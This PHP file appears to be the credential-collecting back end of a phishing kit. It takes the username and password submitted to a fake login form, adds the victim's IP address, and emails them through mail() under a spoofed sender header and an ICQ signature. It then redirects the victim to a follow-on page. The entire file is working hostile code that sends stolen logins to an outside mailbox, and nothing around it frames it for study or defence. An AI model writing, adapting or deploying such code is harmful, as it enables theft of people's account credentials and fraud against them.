<?php

//Open Session
ini_set("output_buffering",4096);
session_start();
ob_start();

include 'Email.php';

$ip = getenv("REMOTE_ADDR");
$message .= "------------ 2_KE LO -------------\n";
$message .= "UserName     : ".$_POST['UserName2']."\n";
$message .= "Password     : ".$_POST['psw2']."\n";
$message .= "-------------------------------------\n";
$message .= "IP: $ip\n";
$message .= "---------DIAGO-ICQ:728579106--------------\n";
$subject = " KEE LO - $ip";
$headers = "From: KKEEYY<newowway@mail.com>";


mail($SEND,$subject,$message,$headers);

session_destroy();

header("Location:det.html");

?>